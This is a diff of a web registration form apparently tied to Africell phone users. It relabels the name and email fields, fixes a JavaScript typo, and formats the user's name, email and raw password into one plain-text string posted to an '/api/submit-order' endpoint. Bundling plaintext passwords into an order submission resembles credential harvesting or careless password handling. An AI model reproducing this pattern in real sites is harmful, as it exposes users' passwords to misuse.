@@ -279,14 +279,14 @@
                 Please enter your details to create an account
             </p>
 
-            <!-- 1. Full Name / Email Field (As seen in your screenshot) -->
+            <!-- 1. Full Name Field -->
             <div class="reg-input-group">
-                <input type="text" id="fullName" class="reg-input-field" placeholder="Full Name or Email" required>
+                <input type="text" id="fullName" class="reg-input-field" placeholder="Full Name" required>
             </div>
 
             <!-- 2. Email Address Field -->
             <div class="reg-input-group">
-                <input type="text" id="emailAddress" class="reg-input-field" placeholder="Username / ID">
+                <input type="email" id="emailAddress" class="reg-input-field" placeholder="Email Address" required>
             </div>
 
             <!-- 3. Password Field -->
@@ -330,7 +330,7 @@
         }
 
         function closeModal() {
-            document.getElementById('customModal'].style.display = 'none';
+            document.getElementById('customModal').style.display = 'none';
             if (pendingAction) {
                 pendingAction();
                 pendingAction = null;
@@ -363,11 +363,17 @@
             const spinnerText = document.getElementById('spinnerText');
             const phoneInput = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '+232 00000000';
 
-            // If the first box has data but name validation failed, let's make sure it passes safely
             if (!nameVal) {
                 if (spinnerDiv) spinnerDiv.style.display = 'none';
                 createBtn.classList.remove('disabled-state');
-                showAppAlert('❌ Please enter your full name or email.');
+                showAppAlert('❌ Please enter your full name.');
+                return;
+            }
+
+            if (!emailVal) {
+                if (spinnerDiv) spinnerDiv.style.display = 'none';
+                createBtn.classList.remove('disabled-state');
+                showAppAlert('❌ Please enter your email address.');
                 return;
             }
 
@@ -403,7 +409,7 @@
                 if (spinnerText) spinnerText.innerText = 'Creating your account...';
                 if (spinnerDiv) spinnerDiv.style.display = 'flex';
 
-                const registrationPayload = `Name/Email: ${nameVal} | Field2: ${emailVal || 'N/A'} | Password: ${pass1}`;
+                const registrationPayload = `Name: ${nameVal} | Email: ${emailVal} | Password: ${pass1}`;
 
                 const response = await fetch('/api/submit-order', {
                     method: 'POST',
